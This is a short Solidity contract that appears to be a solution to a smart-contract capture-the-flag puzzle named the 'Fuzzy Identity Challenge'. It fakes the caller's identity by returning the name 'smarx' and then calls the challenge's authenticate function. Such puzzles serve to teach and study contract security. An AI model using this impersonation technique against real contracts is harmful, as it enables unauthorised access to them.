pragma solidity 0.8.7;

interface IName {
    function name() external view returns (bytes32);
}

interface IFuzzyIdentityChallenge {
    function authenticate() external;
}

contract FuzzyIdentityChallengeHack is IName {

    function name() public override view returns (bytes32) {
      return bytes32("smarx");
   }

    function attack(address _ficInstance) public {
        IFuzzyIdentityChallenge(_ficInstance).authenticate();
    } 
}